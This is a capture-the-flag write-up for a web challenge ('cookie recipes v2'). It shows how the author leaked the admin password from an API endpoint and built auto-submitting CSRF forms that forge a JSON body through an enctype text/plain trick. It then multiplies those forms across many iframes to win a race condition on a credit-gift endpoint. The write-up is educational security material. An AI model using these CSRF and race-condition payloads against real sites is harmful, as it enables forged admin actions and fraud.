## Premise

At first look at the site, we see login and register tabs. Once you create an account and login, we are greeted with our goal and our challenge.

### Our Goal
There is a recipe with a description "This challenge's flag" for sale for 1000 credits. We are given 100 credits to start with no visibile way of getting more. We somehow need to either steal the recipe without paying or find a way to give ourselves enough credit.


### Our Challenge
On the bottom of the page, there is a place to submit a website that the admin will view. Based on this being a web challenge with "cookies" in the title,
it's pretty clear that we'll be using the admin to get something done. 


### Source code analysis, all 800 lines :(
The source code shows us a pretty secure system. The sql is done with prepared statements and there doesn't appear to be any trickery allowed with any of the functions.
We can see that the database is seeded with an admin user that has an id of 0. We can see that there are several API endpoints that will be useful. 
By visting `/api/userInfo?id=0`, we can see the admins username and password. Unfortunately we can't login as the admin because there is a restrictive IP whitelist for 
the admin to log in. Oh well. There is an interesting function called **gift** that allows the admin user to gift 150 credits to a user. The catch is that 
a gift can only be given to a user once and there is a boolean column on user that tracks this. After receiving a gift, the database is updated and the user 
cannot receive another gift. There is a noticable lack of a CSRF token on this endpoint, but to make up for it, there's a "clever" trick:
```
  // Check admin password to prevent CSRF
  let body;
  try {
      body = await util.parseRequest(req);
  } catch (error) {
      res.writeHead(400);
      res.end();
      return;
  }
```
The problem here is that this app doesn't accept a traditional HTML form, it uses a POST request with a JSON body. HTML forms are easy to exploit with CSRF, but a POST
request with a JSON body is CSRF resistant (but not impervious). That means to exploit this, we'd either need to find XSS on the website that we can share with the admin
or we'll need to find a way to create a CSRF form that has a JSON body.

### Crafting the exploit 
First thing we want to do is reliably find a way to get the admin to gift us tokens. After looking at every value we can control, we can quickly rule out XSS.
That means we'll probably need to find a way to commit **CSRF**. To get your user id, visit the api endpoint `/api/getId`, we're going to need it for our CSRF.
#### Normal CSRF
```
<form class='chunky' action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=13394421154615314178">
  <label for="adminpassword">Admins Password Lol:</label><br>
  <input type="password" name="data" value="<script></srcipt>"><br>
  <input type="submit" value="Submit">
</form>

<script>
window.onload = function(){
  $(".chunky").map(function(_, form){
   form.submit()
  });
}
</script>
```
This is a traditional CSRF attempt. When the admin visits the page, the javascript automatically submits the form to the gift endpoint with my user id giving 
me 150 credits. Unfortunately it doesn't have a JSON body so this will get rejected even though it includes the admin password.

#### CSRF with a JSON body
I had to do some research to find out how to make this happen. This article was super useful https://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2.
Basically we'd need to rely on some mutation of the form that tricks the endpoint to thinking what we submitted was JSON. We do this through some trickery with the name
attribute.
```
<form class='chunky' action="https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=15252815482492019401" method="post" enctype="text/plain">
<input type=”text” name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","padding":"' value='true"}'>
<input type="submit" value="send">
</form>
<script>
window.onload = function(){
  $(".chunky").map(function(_, form){
    form.submit()
  });
}
</script>
```
As you can see, there is a padding entry that is split up at the end of the name attribute that gets continued at the value attribute. For some reason, this 
mutates to a valid JSON body that is parsed by the app succesfully. So all we need to do is get the admin to view a page with this value and we'll get our gift.
#### Setting up a publically accessible website
I always use the following method to get a site up quickly.
``` 
php -S localhost:2020
ngrok http 2020
```
This will take your current directory, serve it on localhost:2020, and the ngrok will create a publically accesible url that maps to your localhost.
So we have our publically accessible website, all we need to do is submit it to the admin. We can see that this worked as our balance increases by 150, but 
submitting it again fails due to the column on our user row being changed. 
```
  // Make sure user has not already received a gift
  try {
      if (database.receivedGift(user_id)) {
          util.respondJSON(res, 200, result);
          return;
      }
  } catch (error) {
      res.writeHead(500);
      res.end();
      return;
  }
```
Darn... but at least we know we can hit this endpoint.
#### Getting the Flag with Race Conditions
We noticed that theres some time in the gift function between when the balance on the user is updated and when the giftReceived column is updated. This means that 
theres a possible race condition where we can hit the gift endpoint multiple times in rapid succession and we'd have our balance updated multiple times before it gets
marked that we've received a gift. 
I created a new page that would house our CSRF form in iframes. When the page loads, all the iframes will load and each will submit the form. After doing this twice 
with about 6 iframes, I saw my balance was 400. This means that it worked, normally we'd only be able to get 250 (100 starting + 150 gift). So all I needed to do 
was have a lot more iframes. The ending number of frames that got me a high enough balance to purchase the flag was 121 (but probably could've been done with more or
less). 
